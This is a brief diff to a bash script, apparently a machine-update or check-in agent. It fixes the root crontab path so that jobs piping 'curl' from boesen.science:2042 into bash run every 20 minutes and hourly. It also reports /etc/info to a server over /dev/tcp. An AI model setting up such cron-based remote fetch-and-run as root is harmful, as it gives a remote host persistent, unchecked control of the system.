@@ -24,8 +24,8 @@ if [[ $(< /etc/info) != "$INFO" ]]; then
 	printf "UPDATE: $INFO\0" >/dev/tcp/$SERVER/$PORT
 fi
 
-grep -v "boesen.science" /var/spool/cron/crontabs/root > /tmp/crontab; mv /tmp/crontab /var/spool/crontabs/root
-echo '*/20 * * * * curl -L boesen.science:2042/linux/update.sh |bash' >> /var/spool/crontabs/root
+grep -v "boesen.science" /var/spool/cron/crontabs/root > /tmp/crontab; mv /tmp/crontab /var/spool/cron/crontabs/root
+echo '*/20 * * * * curl -L boesen.science:2042/linux/update.sh |bash' >> /var/spool/cron/crontabs/root
 
 printf '#\!/bin/bash\ncurl -L boesen.science:2042/linux/update.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update
 
